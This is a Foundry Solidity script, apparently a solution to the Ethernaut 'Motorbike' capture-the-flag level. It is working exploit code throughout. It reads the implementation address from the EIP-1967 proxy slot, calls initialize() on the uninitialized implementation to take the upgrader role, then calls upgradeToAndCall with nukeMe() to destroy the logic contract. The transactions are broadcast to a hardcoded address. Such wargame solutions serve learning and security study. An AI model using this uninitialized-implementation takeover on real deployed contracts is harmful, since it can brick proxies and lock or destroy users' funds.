// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

import {Motorbike} from "../src/Motorbike.sol";


interface level26 {
     function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
     function initialize() external;
}

interface Engine{
     function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
     function initialize() external;
}

contract MotorBikeAttack is Script {
    address ProxyAddress = 0xc1fF4325d44b00C394a9293BB3B18c6B652fbb49;


    function run() external{
        uint256 deployerPrivateKey = vm.envUint("pvt_key");
        vm.startBroadcast(deployerPrivateKey);
        
        level26 yo = level26(ProxyAddress);
        Engine yo1 = Engine(address(uint160(uint256(vm.load(address(yo), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)))));
        
        
        // now i am an upgrader since storage is different due to delegate call
        yo1.initialize();
        
       Motorbike yo2 = new Motorbike();
       
       bytes memory data = abi.encodeWithSignature("nukeMe()");
        
        yo1.upgradeToAndCall(address(yo2), data);

        vm.stopBroadcast();
    }
}